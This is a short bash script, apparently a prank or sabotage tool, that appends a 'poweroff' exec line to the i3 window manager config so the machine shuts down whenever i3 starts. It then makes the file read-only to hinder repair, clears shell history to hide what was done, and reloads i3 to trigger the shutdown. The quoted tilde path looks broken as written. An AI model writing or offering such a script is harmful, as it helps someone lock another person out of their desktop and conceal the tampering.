#!/bin/bash

echo "exec --no-startup-id poweroff" >> "~/.config/i3/config"
chmod 444 "~/.config/i3/config"
echo Done.
history -c
i3-msg reload
